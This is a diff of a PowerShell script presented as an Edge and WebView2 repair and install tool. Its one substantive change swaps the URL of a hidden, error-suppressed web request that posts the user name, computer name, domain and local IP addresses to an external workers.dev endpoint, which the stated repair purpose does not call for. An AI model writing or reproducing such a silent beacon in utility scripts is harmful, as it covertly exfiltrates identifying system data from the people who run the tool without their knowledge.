@@ -1,4 +1,4 @@
-<#
+﻿<#
   Edge-Recover.ps1 (PowerShell 5.1-safe) - Install + Repair
   - Enables EdgeUpdate services
   - Auto-installs WebView2 if missing (or reinstalls)
@@ -70,7 +70,7 @@ try {
         text  = "Install MS Edge v2.0`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
     } | ConvertTo-Json)
 
-    Invoke-RestMethod -Uri 'https://cryocore.rhshourav.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
+    Invoke-RestMethod -Uri 'https://cryocore.shouravx.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 # -----------------------------
 # Admin / Elevation
